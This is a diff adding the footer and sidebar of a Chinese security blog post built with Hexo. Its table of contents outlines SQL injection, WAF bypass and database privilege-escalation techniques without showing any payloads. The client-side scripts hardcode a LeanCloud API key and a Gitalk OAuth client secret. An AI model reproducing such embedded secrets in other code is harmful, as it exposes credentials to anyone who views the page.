+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/SQL/" rel="tag"># SQL</a>
+            
+              <a href="/tags/注入/" rel="tag"># 注入</a>
+            
+              <a href="/tags/waf绕过/" rel="tag"># waf绕过</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/信息收集-信息收集思路整理/" rel="next" title="信息收集思路整理">
+                  <i class="fa fa-chevron-left"></i> 信息收集思路整理
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/xss-XSS类型、利用和防御/" rel="prev" title="XSS类型、利用和防御">
+                  XSS类型、利用和防御 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#注入类型"><span class="nav-number">1.</span> <span class="nav-text">注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Union-Based"><span class="nav-number">1.1.</span> <span class="nav-text">Union Based</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-判断注入点"><span class="nav-number">1.1.1.</span> <span class="nav-text">0x01 判断注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-查询共有多少字段"><span class="nav-number">1.1.2.</span> <span class="nav-text">0x02 查询共有多少字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-查询库"><span class="nav-number">1.1.3.</span> <span class="nav-text">0x03 查询库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-查询表"><span class="nav-number">1.1.4.</span> <span class="nav-text">0x04 查询表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-查询字段"><span class="nav-number">1.1.5.</span> <span class="nav-text">0x05 查询字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-查询记录"><span class="nav-number">1.1.6.</span> <span class="nav-text">0x05 查询记录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#关于注释"><span class="nav-number">1.1.7.</span> <span class="nav-text">关于注释</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Error-Based"><span class="nav-number">1.2.</span> <span class="nav-text">Error Based</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bool-Time-Based-（Blind-Based）"><span class="nav-number">1.3.</span> <span class="nav-text">Bool/Time Based （Blind Based）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Bool-Based"><span class="nav-number">1.3.1.</span> <span class="nav-text">Bool Based</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Time-Based"><span class="nav-number">1.3.2.</span> <span class="nav-text">Time Based</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他用到的函数-关键字"><span class="nav-number">1.3.3.</span> <span class="nav-text">其他用到的函数/关键字</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#堆叠注入"><span class="nav-number">1.4.</span> <span class="nav-text">堆叠注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#非where的注入点"><span class="nav-number">2.</span> <span class="nav-text">非where的注入点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#order-by注入点"><span class="nav-number">2.1.</span> <span class="nav-text">order by注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#limit注入点"><span class="nav-number">2.2.</span> <span class="nav-text">limit注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#group-by注入点"><span class="nav-number">2.3.</span> <span class="nav-text">group by注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#table注入点"><span class="nav-number">2.4.</span> <span class="nav-text">table注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#desc注入点"><span class="nav-number">2.5.</span> <span class="nav-text">desc注入点</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#like-注入点"><span class="nav-number">3.</span> <span class="nav-text">like 注入点</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#宽字节注入"><span class="nav-number">4.</span> <span class="nav-text">宽字节注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#产生原因"><span class="nav-number">4.1.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#iconv转换情况"><span class="nav-number">4.2.</span> <span class="nav-text">iconv转换情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解决办法"><span class="nav-number">4.3.</span> <span class="nav-text">解决办法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过"><span class="nav-number">5.</span> <span class="nav-text">绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过字符"><span class="nav-number">5.1.</span> <span class="nav-text">绕过字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过ngx-lua-waf"><span class="nav-number">5.2.</span> <span class="nav-text">绕过ngx_lua_waf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP-参数污染（HPP）"><span class="nav-number">5.2.1.</span> <span class="nav-text">HTTP 参数污染（HPP）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#URI参数溢出"><span class="nav-number">5.2.2.</span> <span class="nav-text">URI参数溢出</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过360主机卫士"><span class="nav-number">5.3.</span> <span class="nav-text">绕过360主机卫士</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用默认白名单"><span class="nav-number">5.3.1.</span> <span class="nav-text">利用默认白名单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用静态资源"><span class="nav-number">5.3.2.</span> <span class="nav-text">利用静态资源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#缓冲区溢出"><span class="nav-number">5.3.3.</span> <span class="nav-text">缓冲区溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#URI参数溢出-1"><span class="nav-number">5.3.4.</span> <span class="nav-text">URI参数溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GET-POST"><span class="nav-number">5.3.5.</span> <span class="nav-text">GET+POST</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#multipart-form-data"><span class="nav-number">5.3.6.</span> <span class="nav-text">multipart/form-data</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内联注释"><span class="nav-number">5.3.7.</span> <span class="nav-text">内联注释</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过护卫神"><span class="nav-number">5.4.</span> <span class="nav-text">绕过护卫神</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#00截断"><span class="nav-number">5.4.1.</span> <span class="nav-text">%00截断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Unicode编码"><span class="nav-number">5.4.2.</span> <span class="nav-text">Unicode编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HPP"><span class="nav-number">5.4.3.</span> <span class="nav-text">HPP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#号"><span class="nav-number">5.4.4.</span> <span class="nav-text">%号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#缓冲区溢出-1"><span class="nav-number">5.4.5.</span> <span class="nav-text">缓冲区溢出</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过安全狗"><span class="nav-number">5.5.</span> <span class="nav-text">绕过安全狗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分块传输"><span class="nav-number">5.6.</span> <span class="nav-text">分块传输</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLMap-Tamper写法"><span class="nav-number">5.7.</span> <span class="nav-text">SQLMap Tamper写法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#不同用户的权限"><span class="nav-number">6.</span> <span class="nav-text">不同用户的权限</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL"><span class="nav-number">6.1.</span> <span class="nav-text">MySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSSQL"><span class="nav-number">6.2.</span> <span class="nav-text">MSSQL</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#写文件"><span class="nav-number">7.</span> <span class="nav-text">写文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#提权"><span class="nav-number">8.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#用户自定义函数提权（UDF）"><span class="nav-number">8.1.</span> <span class="nav-text">用户自定义函数提权（UDF）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#获取UDF-dll的hex编码"><span class="nav-number">8.1.1.</span> <span class="nav-text">获取UDF.dll的hex编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#保存udf-dll到目标主机"><span class="nav-number">8.1.2.</span> <span class="nav-text">保存udf.dll到目标主机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用用户函数提权"><span class="nav-number">8.1.3.</span> <span class="nav-text">使用用户函数提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mof提权"><span class="nav-number">8.2.</span> <span class="nav-text">mof提权</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#防御——使用预编译语句"><span class="nav-number">9.</span> <span class="nav-text">防御——使用预编译语句</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">10.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.jpg"
+      alt="Anemone">
+  <p class="site-author-name" itemprop="name">Anemone</p>
+  <div class="site-description" itemprop="description">关注Web安全、移动安全、Fuzz测试和机器学习</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">70</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/anemone95" title="GitHub &rarr; https://github.com/anemone95" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:anemone95@qq.com" title="E-Mail &rarr; mailto:anemone95@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">anemone</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+  
+  <script>
+  function leancloudSelector(url) {
+    return document.getElementById(url).querySelector('.leancloud-visitors-count');
+  }
+  if (CONFIG.page.isPost) {
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = visitors.getAttribute('id').trim();
+      var title = visitors.getAttribute('data-flag-title').trim();
+
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .then(response => response.json())
+              .then(() => {
+                leancloudSelector(url).innerText = counter.time + 1;
+              })
+            
+              .catch(error => {
+                console.log('Failed to save visitor count', error);
+              })
+          } else {
+              Counter('post', '/classes/Counter', { title: title, url: url, time: 1 })
+                .then(response => response.json())
+                .then(() => {
+                  leancloudSelector(url).innerText = 1;
+                })
+                .catch(error => {
+                  console.log('Failed to create', error);
+                });
+            
+          }
+        })
+        .catch(error => {
+          console.log('LeanCloud Counter Error', error);
+        });
+    }
+  } else {
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return element.getAttribute('id').trim();
+      });
+
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url: { '$in': entries } })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length === 0) {
+            document.querySelectorAll('.leancloud_visitors .leancloud-visitors-count').forEach(element => {
+              element.innerText = 0;
+            });
+            return;
+          }
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.url;
+            var time = item.time;
+            leancloudSelector(url).innerText = time;
+          }
+          for (var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = leancloudSelector(url);
+            if (element.innerText == '') {
+              element.innerText = 0;
+            }
+          }
+        })
+        .catch(error => {
+          console.log('LeanCloud Counter Error', error);
+        });
+    }
+  }
+
+  fetch('https://app-router.leancloud.cn/2/route?appId=o5UaCJdPfEG0g7MVxXSMagpT-gzGzoHsz')
+    .then(response => response.json())
+    .then(({ api_server }) => {
+      var Counter = (method, url, data) => {
+        return fetch(`https://${api_server}/1.1${url}`, {
+          method: method,
+          headers: {
+            'X-LC-Id': 'o5UaCJdPfEG0g7MVxXSMagpT-gzGzoHsz',
+            'X-LC-Key': 'c6IN1PuMV3QPltJcrHfn74Gt',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        const localhost = /http:\/\/(localhost|127.0.0.1|0.0.0.0)/;
+        if (localhost.test(document.URL)) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.1.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css">
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.js"></script><script src="/js/algolia-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+<script>
+if (document.querySelectorAll('pre.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      theme: 'forest',
+      logLevel: 3,
+      flowchart: { curve: 'linear' },
+      gantt: { axisFormat: '%m/%d/%Y' },
+      sequence: { actorMargin: 50 }
+    });
+  }, window.mermaid);
+}
+</script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID: 'f3075553d7b0225df6ca',
+      clientSecret: '68362ba87c4cc8e13103afcf729f5bd8ea176a78',
+      repo: 'anemone95.github.io',
+      owner: 'Anemone95',
+      admin: ['Anemone95'],
+      id: 'c0fc361d77918e9d8c9081af003cbf37',
+        language: window.navigator.language || window.navigator.userLanguage,
+      
+      distractionFreeMode: 'true'
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+</script>
+
+</body>
+</html>
